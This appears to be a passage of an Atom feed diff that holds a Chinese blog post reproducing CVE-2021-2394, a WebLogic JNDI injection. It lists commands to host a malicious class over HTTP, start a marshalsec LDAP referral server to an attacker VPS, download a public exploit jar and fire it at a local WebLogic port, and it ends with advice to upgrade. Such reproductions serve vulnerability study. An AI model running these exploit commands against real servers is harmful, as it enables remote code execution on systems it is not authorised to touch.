+&lt;li&gt;在 VPS 同目录下使用 python 开启一个 http 服务，并使用 marshalsec 开启 JNDI 服务&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python3 &lt;span class=&#34;token parameter variable&#34;&gt;-m&lt;/span&gt; http.server &lt;span class=&#34;token number&#34;&gt;8080&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;java&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &lt;span class=&#34;token string&#34;&gt;&#34;http://YOUR-VPS-IP:8080/#Evil&#34;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6666&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182209638.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=K9hl0&amp;amp;originHeight=102&amp;amp;originWidth=628&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;利用 exp 进行复现&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;wget&lt;/span&gt; https://github.com/lz2y/CVE-2021-2394/releases/download/2.0/CVE_2021_2394_jar.zip&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;java&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-jar&lt;/span&gt; CVE_2021_2394.jar &lt;span class=&#34;token number&#34;&gt;127.0&lt;/span&gt;.0.1 &lt;span class=&#34;token number&#34;&gt;7001&lt;/span&gt; ldap://YUR-IP-VPS:6666/Evil&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;结果&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182124937.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=KEYuX&amp;amp;originHeight=909&amp;amp;originWidth=1888&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;修复建议-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议-7&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;升级版本&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <updated>2022-10-18T14:24:49.000Z</updated>
+    </entry>
+</feed>
